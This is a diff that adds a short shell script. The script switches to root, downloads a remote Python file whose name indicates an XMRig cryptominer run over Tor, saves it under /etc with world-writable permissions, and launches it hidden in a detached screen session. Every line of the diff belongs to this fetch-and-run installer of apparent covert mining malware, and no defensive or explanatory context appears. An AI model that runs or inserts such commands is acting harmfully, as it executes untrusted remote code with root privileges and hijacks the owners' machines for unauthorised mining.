@@ -1,0 +1,7 @@
+sudo su root
+wget https://raw.githubusercontent.com/nhatquanglan/daovps/master/daoxmrig_ubuntu_tor.py -O /etc/dao.py
+chmod 777 /etc/dao.py
+screen -dm python /etc/dao.py
+exit
+exit
+exit
